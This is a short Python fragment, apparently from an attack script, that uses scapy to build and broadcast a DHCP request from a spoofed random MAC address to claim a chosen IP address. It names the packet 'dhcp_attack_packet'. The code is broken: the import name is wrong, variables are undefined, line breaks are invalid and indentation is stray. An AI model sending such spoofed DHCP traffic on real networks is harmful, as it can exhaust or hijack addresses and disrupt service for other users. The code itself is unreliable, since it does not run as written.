
from scapy.all import (Ether,RandMac,IP,UDP,BOOTP,DHCP,sendp,sniff)


dhcp_request = Ether(src=rand_mac_address, dst='ff:ff:ff:ff:ff:ff')
/ IP(src='0.0.0.0',dst='255.255.255.255')/UDP(sport=68,dport=67)
/BOOTP(chaddr=rand_mac_address)
/DHCP(options=[("message-type",'request'),
("server_id",dhcp_address),
("requested_addr",need_address),"end"])
   sendp(dhcp_attack_packet,verbose=0)
   print ("[+] USE IP: "+need_address)